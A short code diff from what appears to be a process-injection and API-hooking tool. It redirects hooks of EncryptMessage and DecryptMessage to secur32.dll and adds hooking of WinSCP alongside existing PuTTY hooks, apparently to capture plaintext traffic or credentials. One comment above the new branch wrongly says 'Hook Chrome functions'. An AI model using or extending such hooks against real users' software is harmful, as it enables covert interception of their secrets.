@@ -118,7 +118,7 @@ void Inject()
 
 		// EncryptMessage, DecryptMessage
 
-		else if(Utils::ToLower(vDlls[i].szModule).compare("ncrypt.dll") == 0)
+		else if(Utils::ToLower(vDlls[i].szModule).compare("secur32.dll") == 0)
 		{
 			EncryptMessage_Original = (EncryptMessage_Typedef)GetProcAddress(LoadLibrary("secur32.dll"), "EncryptMessage");
 			DecryptMessage_Original = (DecryptMessage_Typedef)GetProcAddress(LoadLibrary("secur32.dll"), "DecryptMessage");
@@ -144,6 +144,15 @@ void Inject()
 			// Hook Chrome functions
 
 			HookPutty();
+		}
+
+		// WinSCP.exe
+
+		else if(Utils::ToLower(vDlls[i].szModule).compare("winscp.exe") == 0)
+		{
+			// Hook Chrome functions
+
+			HookWinSCP(); 
 		}
 	}
 
